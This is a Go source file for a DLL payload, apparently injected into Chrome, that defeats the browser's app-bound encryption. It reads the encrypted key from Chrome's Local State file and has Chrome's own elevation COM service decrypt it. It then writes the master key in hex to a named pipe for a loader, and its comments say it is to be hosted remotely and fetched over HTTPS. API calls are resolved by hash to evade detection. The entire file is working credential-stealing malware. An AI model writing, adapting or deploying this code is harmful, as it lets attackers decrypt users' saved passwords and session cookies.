// build with go build -buildmode=c-shared -ldflags="-s -w" -trimpath -o gobound.dll
// host at any remote endpoint that can be downloaded via https so net.go can pull it down
package main

import "C"

import (
	"encoding/base64"
	"fmt"
	"os"
	"strings"
	"unsafe"

	wincall "github.com/carved4/go-wincall"
)

var (
	kernel32Base             uintptr
	ole32Base                uintptr
	oleaut32Base             uintptr
	createFileW              uintptr
	writeFile                uintptr
	closeHandle              uintptr
	coInitializeEx           uintptr
	coUninitialize           uintptr
	coCreateInstance         uintptr
	coSetProxyBlanket        uintptr
	sysAllocStringByteLen    uintptr
	sysFreeString            uintptr
	sysStringByteLen         uintptr
	freeLibraryAndExitThread uintptr
	getModuleHandleW         uintptr
	hPipe                    uintptr
	hModule                  uintptr
)

const (
	GENERIC_READ          = 0x80000000
	GENERIC_WRITE         = 0x40000000
	OPEN_EXISTING         = 3
	FILE_ATTRIBUTE_NORMAL = 0x80
	INVALID_HANDLE_VALUE  = ^uintptr(0)
	CLSCTX_LOCAL_SERVER   = 0x4
	pipeName              = `\\.\pipe\chromepipe`
)

var (
	CLSID_ChromeElevator = GUID{0x708860E0, 0xF641, 0x4611, [8]byte{0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}
	IID_IElevator        = GUID{0x463ABECF, 0x410D, 0x407F, [8]byte{0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}
)

func init() {
	kernel32Base = wincall.GetModuleBase(wincall.GetHash("kernel32.dll"))
	ole32Base = wincall.LoadLibraryLdr("ole32.dll")
	oleaut32Base = wincall.LoadLibraryLdr("oleaut32.dll")

	createFileW = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CreateFileW"))
	writeFile = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("WriteFile"))
	closeHandle = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CloseHandle"))

	coInitializeEx = wincall.GetFunctionAddress(ole32Base, wincall.GetHash("CoInitializeEx"))
	coUninitialize = wincall.GetFunctionAddress(ole32Base, wincall.GetHash("CoUninitialize"))
	coCreateInstance = wincall.GetFunctionAddress(ole32Base, wincall.GetHash("CoCreateInstance"))
	coSetProxyBlanket = wincall.GetFunctionAddress(ole32Base, wincall.GetHash("CoSetProxyBlanket"))

	sysAllocStringByteLen = wincall.GetFunctionAddress(oleaut32Base, wincall.GetHash("SysAllocStringByteLen"))
	sysFreeString = wincall.GetFunctionAddress(oleaut32Base, wincall.GetHash("SysFreeString"))
	sysStringByteLen = wincall.GetFunctionAddress(oleaut32Base, wincall.GetHash("SysStringByteLen"))
	freeLibraryAndExitThread = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("FreeLibraryAndExitThread"))
	getModuleHandleW = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("GetModuleHandleW"))

	dllName, _ := wincall.UTF16ptr("payload.dll")
	hModule, _, _ = wincall.CallG0(getModuleHandleW, uintptr(unsafe.Pointer(dllName)))

	go run()
}

func writePipe(msg string) {
	if hPipe == 0 || hPipe == INVALID_HANDLE_VALUE {
		return
	}
	data := []byte(msg + "\x00")
	var written uint32
	wincall.CallG0(writeFile,
		hPipe,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
		uintptr(0),
	)
}

func connectPipe() bool {
	pipeNamePtr, _ := wincall.UTF16ptr(pipeName)
	hPipe, _, _ = wincall.CallG0(createFileW,
		uintptr(unsafe.Pointer(pipeNamePtr)),
		uintptr(GENERIC_READ|GENERIC_WRITE),
		uintptr(0),
		uintptr(0),
		uintptr(OPEN_EXISTING),
		uintptr(FILE_ATTRIBUTE_NORMAL),
		uintptr(0),
	)
	if hPipe != INVALID_HANDLE_VALUE && hPipe != 0 {
		writePipe("[+] pipe created and listening: " + pipeName)
		return true
	}
	return false
}

func initCOM() bool {
	hr, _, _ := wincall.CallG0(coInitializeEx, uintptr(0), uintptr(0x2))
	return hr == 0 || hr == 1
}

func uninitCOM() {
	wincall.CallG0(coUninitialize)
}

func decryptKey(encryptedKey []byte) ([]byte, error) {
	bstrEnc, _, _ := wincall.CallG0(sysAllocStringByteLen,
		uintptr(unsafe.Pointer(&encryptedKey[0])),
		uintptr(len(encryptedKey)),
	)
	if bstrEnc == 0 {
		return nil, fmt.Errorf("SysAllocStringByteLen failed")
	}
	defer wincall.CallG0(sysFreeString, bstrEnc)

	var pElevator uintptr
	hr, _, _ := wincall.CallG0(coCreateInstance,
		uintptr(unsafe.Pointer(&CLSID_ChromeElevator)),
		uintptr(0),
		uintptr(CLSCTX_LOCAL_SERVER),
		uintptr(unsafe.Pointer(&IID_IElevator)),
		uintptr(unsafe.Pointer(&pElevator)),
	)
	if hr != 0 {
		return nil, fmt.Errorf("CoCreateInstance failed: 0x%x", hr)
	}

	hr, _, _ = wincall.CallG0(coSetProxyBlanket,
		pElevator,
		uintptr(0xFFFFFFFF),
		uintptr(0xFFFFFFFF),
		uintptr(0),
		uintptr(6),
		uintptr(3),
		uintptr(0),
		uintptr(0x40),
	)

	vtable := *(*uintptr)(unsafe.Pointer(pElevator))

	decryptDataFn := *(*uintptr)(unsafe.Pointer(vtable + 5*unsafe.Sizeof(uintptr(0))))

	var bstrPlain uintptr
	var lastError uint32
	hr, _, _ = wincall.CallG0(decryptDataFn,
		pElevator,
		bstrEnc,
		uintptr(unsafe.Pointer(&bstrPlain)),
		uintptr(unsafe.Pointer(&lastError)),
	)
	if hr != 0 {
		return nil, fmt.Errorf("DecryptData failed: 0x%x, lastError: %d", hr, lastError)
	}
	if bstrPlain == 0 {
		return nil, fmt.Errorf("DecryptData returned null")
	}
	defer wincall.CallG0(sysFreeString, bstrPlain)

	bstrLen, _, _ := wincall.CallG0(sysStringByteLen, bstrPlain)
	if bstrLen == 0 {
		return nil, fmt.Errorf("decrypted key is empty")
	}

	result := make([]byte, bstrLen)
	copy(result, unsafe.Slice((*byte)(unsafe.Pointer(bstrPlain)), bstrLen))

	return result, nil
}

func getLocalStatePath() string {
	localAppData := os.Getenv("LOCALAPPDATA")
	return localAppData + `\Google\Chrome\User Data\Local State`
}

func readEncryptedKey() ([]byte, error) {
	data, err := os.ReadFile(getLocalStatePath())
	if err != nil {
		return nil, fmt.Errorf("read Local State: %v", err)
	}

	content := string(data)
	tag := `"app_bound_encrypted_key":"`
	idx := strings.Index(content, tag)
	if idx == -1 {
		return nil, fmt.Errorf("app_bound_encrypted_key not found")
	}

	start := idx + len(tag)
	end := strings.Index(content[start:], `"`)
	if end == -1 {
		return nil, fmt.Errorf("malformed JSON")
	}

	b64Key := content[start : start+end]
	decoded, err := base64.StdEncoding.DecodeString(b64Key)
	if err != nil {
		return nil, fmt.Errorf("base64 decode: %v", err)
	}

	if len(decoded) < 4 {
		return nil, fmt.Errorf("key too short")
	}
	return decoded[4:], nil
}

func run() {
	if !connectPipe() {
		return
	}
	defer wincall.CallG0(closeHandle, hPipe)

	if !initCOM() {
		return
	}
	defer uninitCOM()

	encKey, err := readEncryptedKey()
	if err != nil {
		return
	}

	masterKey, err := decryptKey(encKey)
	if err != nil {
		return
	}

	keyHex := fmt.Sprintf("%X", masterKey)
	writePipe(fmt.Sprintf("KEY:%s", keyHex))
	writePipe("DONE")

	if hModule != 0 {
		wincall.CallG0(freeLibraryAndExitThread, hModule, 0)
	}
}

func main() {}
